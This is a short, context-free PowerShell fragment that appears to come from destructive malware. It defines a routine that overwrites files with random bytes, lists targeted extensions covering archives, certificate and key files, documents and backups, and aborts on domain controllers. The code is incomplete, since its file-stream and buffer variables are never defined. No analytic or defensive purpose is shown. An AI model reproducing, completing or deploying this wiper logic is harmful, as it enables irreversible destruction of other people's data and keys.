function WriteRandomBytes($path){ $fs.Write($buf,0,32) }
$exts = @(".rar",".zip",".pcks",".pcks12",".pcks7",".pem",".doc",".bak")
if ((Get-WmiObject Win32_OperatingSystem).ProductType -eq 2) { exit }  # DomainController abort
